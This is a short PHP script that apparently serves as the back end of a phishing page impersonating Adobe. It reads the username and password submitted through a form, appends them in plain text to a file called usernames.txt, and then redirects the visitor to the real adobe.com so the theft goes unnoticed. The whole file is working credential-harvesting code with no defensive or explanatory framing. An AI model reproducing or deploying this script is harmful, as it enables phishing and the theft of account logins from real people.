<?php

file_put_contents("usernames.txt", "Adobe Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://adobe.com');
exit();
?>